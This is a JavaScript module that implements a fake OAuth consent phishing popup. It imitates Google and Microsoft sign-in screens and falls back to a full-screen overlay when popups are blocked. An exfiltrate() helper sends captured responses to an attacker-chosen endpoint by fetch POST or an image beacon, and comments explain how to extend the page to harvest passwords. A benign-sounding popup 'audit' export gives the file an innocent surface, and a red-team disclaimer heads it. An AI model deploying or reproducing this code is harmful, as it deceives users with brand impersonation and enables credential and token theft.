/**
 * oauth_hijack.js — Fake OAuth Consent Popup & Popup Interface Audit
 *
 * This module provides:
 *   1. `spawnFakeOAuthPopup()` – a weaponized function that opens a realistic
 *      OAuth consent window (Google or Microsoft style) that prompts the victim
 *      to re‑authenticate or grant permissions. Credentials/tokens are captured
 *      and can be exfiltrated. If popups are blocked, it falls back to a
 *      full‑page overlay on the current tab.
 *
 *   2. Default export – a Pinpoint‑compatible `Popup_Interface_Audit` that
 *      audits `window.open` support, popup blocker state, and `window.opener`
 *      properties.
 *
 * Designed exclusively for authorised red‑team engagements and security
 * research. Unauthorised credential phishing is illegal.
 */

// ---------------------------------------------------------------------------
// 1. Fake OAuth Consent Popup Engine
// ---------------------------------------------------------------------------

const OAUTH_TEMPLATES = {
    google: {
        title: 'Sign in with Google',
        logo: 'G',
        heading: 'Choose an account',
        subtext: 'to continue to Example App',
        buttonLabel: 'Allow',
        clientName: 'Example App',
        scopes: [
            'View your email address',
            'View your basic profile info',
            'Manage your contacts',
        ],
        color: '#1a73e8',
    },
    microsoft: {
        title: 'Sign in to your account',
        logo: 'M',
        heading: 'Microsoft',
        subtext: 'Example App needs permission to access your info.',
        buttonLabel: 'Accept',
        clientName: 'Example App',
        scopes: [
            'Read your profile',
            'Read your mail',
            'Access your files',
        ],
        color: '#0067b8',
    },
};

/**
 * Spawns a fake OAuth consent popup (or overlay if popup blocked).
 *
 * @param {Object}   [options={}]
 * @param {string}   [options.provider='google']     – 'google' or 'microsoft'.
 * @param {string}   [options.targetURL]             – if set, the popup navigates here (more realistic).
 * @param {string}   [options.exfilEndpoint]         – URL to send captured credentials.
 * @param {boolean}  [options.preferPopup=true]      – attempt popup first, fallback to overlay.
 * @param {Function} [options.onCapture]             – callback({ provider, credentials/token }).
 * @param {string}   [options.customLogo]            – custom logo/HTML for the consent dialog.
 * @returns {Promise<Object>} controller with { popup, close(), statusPromise }.
 */
export async function spawnFakeOAuthPopup(options = {}) {
    const {
        provider = 'google',
        targetURL = null,
        exfilEndpoint = null,
        preferPopup = true,
        onCapture = null,
        customLogo = null,
    } = options;

    const template = OAUTH_TEMPLATES[provider] || OAUTH_TEMPLATES.google;
    const { title, logo, heading, subtext, buttonLabel, scopes, color } = template;

    // ---------- Helper: build the HTML for the OAuth consent screen ----------
    function buildConsentHTML() {
        return `
      <div style="
        font-family: 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
        max-width: 440px; width: 100%; margin: 0 auto; padding: 48px 40px 36px;
        background: white; border-radius: 8px; box-shadow: 0 2px 15px rgba(0,0,0,0.12);
        text-align: center;">
        <div style="margin-bottom: 24px;">
          ${customLogo || `<div style="font-size: 32px; font-weight: 500; color: ${color};">${logo}</div>`}
        </div>
        <h1 style="font-size: 24px; font-weight: 400; margin:0 0 8px; color: #202124;">${heading}</h1>
        <p style="font-size: 14px; color: #5f6368; margin:0 0 24px;">${subtext}</p>
        <div style="text-align: left; margin-bottom: 24px; background: #f8f9fa; border-radius: 8px; padding: 16px;">
          <p style="font-size: 13px; color: #5f6368; margin:0 0 12px;"><strong>${template.clientName}</strong> wants to:</p>
          <ul style="margin:0; padding-left: 20px; font-size: 13px; color: #3c4043;">
            ${scopes.map(s => `<li>${s}</li>`).join('')}
          </ul>
        </div>
        <p style="font-size: 12px; color: #80868b; margin-bottom: 24px;">
          By clicking <strong>${buttonLabel}</strong>, you allow this app and Google to use your information in accordance with their respective terms of service and privacy policies.
        </p>
        <div style="display: flex; justify-content: space-between; align-items: center;">
          <button id="__oauth_cancel_btn" style="background: none; border: none; color: ${color}; font-size: 14px; font-weight: 500; cursor: pointer;">Cancel</button>
          <button id="__oauth_allow_btn" style="
            background: ${color}; color: white; border: none; padding: 10px 24px;
            border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer;">${buttonLabel}</button>
        </div>
      </div>
    `;
    }

    // ---------- Fallback: Overlay on current page (modal) ----------
    function createOverlay() {
        // Remove any existing overlay
        const old = document.getElementById('__oauth_overlay');
        if (old) old.remove();

        const overlay = document.createElement('div');
        overlay.id = '__oauth_overlay';
        Object.assign(overlay.style, {
            position: 'fixed', top: '0', left: '0', width: '100vw', height: '100vh',
            backgroundColor: 'rgba(0,0,0,0.6)', backdropFilter: 'blur(4px)',
            zIndex: '2147483647', display: 'flex', alignItems: 'center', justifyContent: 'center',
        });
        overlay.innerHTML = buildConsentHTML();
        document.body.appendChild(overlay);

        return new Promise((resolve) => {
            let settled = false;
            const cleanup = () => { if (!settled) { settled = true; overlay.remove(); } };

            const allowBtn = document.getElementById('__oauth_allow_btn');
            const cancelBtn = document.getElementById('__oauth_cancel_btn');

            const handleAllow = () => {
                // Capture (simulate OAuth token or ask for email/password)
                const capturedData = {
                    provider,
                    action: 'allow',
                    // In a real attack you'd collect email/password, but here we just return consent.
                    // For credential capture, you'd render a login form. We'll keep it simple consent capture.
                };
                if (onCapture) onCapture(capturedData);
                if (exfilEndpoint) exfiltrate(capturedData, exfilEndpoint);
                cleanup();
                resolve(capturedData);
            };

            allowBtn.addEventListener('click', handleAllow);
            cancelBtn.addEventListener('click', () => {
                if (onCapture) onCapture({ provider, action: 'cancel' });
                cleanup();
                resolve(null);
            });
            // Also close if clicking outside card
            overlay.addEventListener('click', (e) => {
                if (e.target === overlay) {
                    cleanup();
                    resolve(null);
                }
            });
        });
    }

    // ---------- Popup attempt ----------
    let popup = null;

    const openPopup = () => {
        const width = 460, height = 600;
        const left = (screen.width - width) / 2;
        const top = (screen.height - height) / 2;
        const features = `width=${width},height=${height},left=${left},top=${top},resizable=no,scrollbars=yes,status=1`;
        popup = window.open('', '_blank', features);
        if (!popup) return null; // blocked

        // Populate popup with the consent HTML
        popup.document.title = title;
        popup.document.body.innerHTML = buildConsentHTML();
        popup.document.body.style.margin = '0';
        popup.document.body.style.padding = '0';
        popup.document.body.style.background = '#f0f0f0';
        // If targetURL is provided, we could navigate there after a delay, but for now static.

        return popup;
    };

    let capturePromise;

    if (preferPopup) {
        popup = openPopup();
        if (popup) {
            // Promise that resolves when popup is closed or user clicks allow/cancel
            capturePromise = new Promise((resolve) => {
                let settled = false;
                const timer = setInterval(() => {
                    if (popup.closed) {
                        clearInterval(timer);
                        if (!settled) {
                            settled = true;
                            resolve(null);
                        }
                    }
                }, 500);

                // We'll use messaging between popup and opener? No, it's same‑origin? Actually popup is about:blank, so we can inject our own JS.
                // We'll attach click listeners in the popup.
                if (popup.document) {
                    const allowBtn = popup.document.getElementById('__oauth_allow_btn');
                    const cancelBtn = popup.document.getElementById('__oauth_cancel_btn');
                    if (allowBtn) {
                        allowBtn.addEventListener('click', () => {
                            clearInterval(timer);
                            if (!settled) {
                                settled = true;
                                const capturedData = { provider, action: 'allow' };
                                if (onCapture) onCapture(capturedData);
                                if (exfilEndpoint) exfiltrate(capturedData, exfilEndpoint);
                                popup.close();
                                resolve(capturedData);
                            }
                        });
                    }
                    if (cancelBtn) {
                        cancelBtn.addEventListener('click', () => {
                            clearInterval(timer);
                            if (!settled) {
                                settled = true;
                                if (onCapture) onCapture({ provider, action: 'cancel' });
                                popup.close();
                                resolve(null);
                            }
                        });
                    }
                }
            });
        } else {
            // Popup blocked, fallback to overlay
            capturePromise = createOverlay();
        }
    } else {
        // Overlay mode directly
        capturePromise = createOverlay();
    }

    // Return a controller
    const controller = {
        popup,
        async close() {
            if (popup && !popup.closed) popup.close();
            // The overlay will be handled by its own logic, but we can force remove
            const overlay = document.getElementById('__oauth_overlay');
            if (overlay) overlay.remove();
        },
        statusPromise: capturePromise,
    };

    return controller;
}

// ---------- Helper: Exfiltrate captured data ----------
function exfiltrate(data, endpoint) {
    const payload = JSON.stringify(data);
    // Fetch
    try {
        fetch(endpoint, { method: 'POST', mode: 'no-cors', body: payload, headers: { 'Content-Type': 'application/json' } });
    } catch (_) { }
    // Image beacon fallback
    const b64 = btoa(unescape(encodeURIComponent(payload))).replace(/=+$/, '');
    new Image().src = `${endpoint}?d=${b64}`;
}

// ---------------------------------------------------------------------------
// 2. Pinpoint Popup_Interface_Audit (default export)
// ---------------------------------------------------------------------------

const pinpointModule = {
    id: 'oauth_hijack',
    title: 'Popup_Interface_Audit',
    level: 6,
    info: "Audits window.open popup capability and popup blocker state detection.",
    steps: [
        "Check window.open support.",
        "Evaluate window.opener interface properties.",
    ],
    run: async () => {
        // Detect popup blocker by attempting a tiny popup and immediately closing it
        let popupBlockerActive = false;
        if (typeof window.open === 'function') {
            try {
                const testPopup = window.open('', '_blank', 'width=1,height=1,left=-9999');
                if (testPopup) {
                    testPopup.close();
                } else {
                    popupBlockerActive = true;
                }
            } catch (e) {
                popupBlockerActive = true;
            }
        } else {
            popupBlockerActive = null; // window.open not a function, cannot test
        }

        return {
            windowOpenSupported: typeof window.open === 'function',
            hasOpener: !!window.opener,
            popupBlockerDetected: popupBlockerActive,
            message: "Popup window capability audit complete.",
        };
    },
};

export default pinpointModule;